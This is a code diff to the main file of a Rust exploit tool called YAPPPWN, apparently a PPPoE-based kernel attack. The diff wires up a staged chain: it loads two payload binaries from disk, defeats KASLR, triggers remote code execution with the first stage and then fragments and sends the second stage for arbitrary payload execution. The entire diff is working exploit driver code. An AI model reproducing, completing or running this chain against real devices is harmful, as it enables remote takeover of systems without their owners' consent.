@@ -6,13 +6,27 @@ use exploit::{Exploit, LcpEchoHandler};
 use parser::{get_args, Args};
 use pnet::datalink::{self, NetworkInterface};
 
-fn run_exploit(interface_name: String) {
+use std::fs::File;
+use std::io::{self, Read};
+
+fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
+    let mut file = File::open(file_path)?;
+    let mut buffer = Vec::new();
+    file.read_to_end(&mut buffer)?;
+    Ok(buffer) // Return the buffer
+}
+
+fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String) {
     // Find interface
     let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;
-
     // Find the network interface with the provided name
     let interfaces = datalink::interfaces();
     let interface = interfaces.into_iter().find(interface_names_match).unwrap();
+
+    // Load binaries of the two pyaloads
+    let stage1 = read_stage(&stage1_path);
+    let stage2 = read_stage(&stage2_path);
+
     // Exploit
     let mut expl = Exploit {
         source_mac: [0, 0, 0, 0, 0, 0],
@@ -21,6 +35,7 @@ fn run_exploit(interface_name: String) {
         host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
         target_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
         source_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+        kaslr_offset: 0,
     };
     // LCP
     let mut handler = exploit::LcpEchoHandler::new(&interface);
@@ -38,12 +53,12 @@ fn run_exploit(interface_name: String) {
     println!("[+] STAGE 2: KASLR defeat");
     expl.defeat_kaslr(&interface);
     println!("[+] STAGE 3: Remote code execution");
-    expl.remote_code_exec(&interface); // TODO Add malicious LCP
+    expl.remote_code_exec(&interface, stage1.unwrap());
     expl.ppp_negotiation(&interface, None);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("[+] STAGE 4: Arbitrary payload execution");
-    // expl.frag_and_send(&interface, stage2);
+    expl.frag_and_send(&interface, stage2.unwrap());
     handler.stop();
     println!("[+] DONE!");
 }
@@ -53,5 +68,5 @@ fn main() {
     println!("[+] YAPPPWN [+]");
     let args: Args = get_args();
     println!("{}", args);
-    run_exploit(args.interface)
+    run_exploit(args.interface, args.stage_1, args.stage_2)
 }
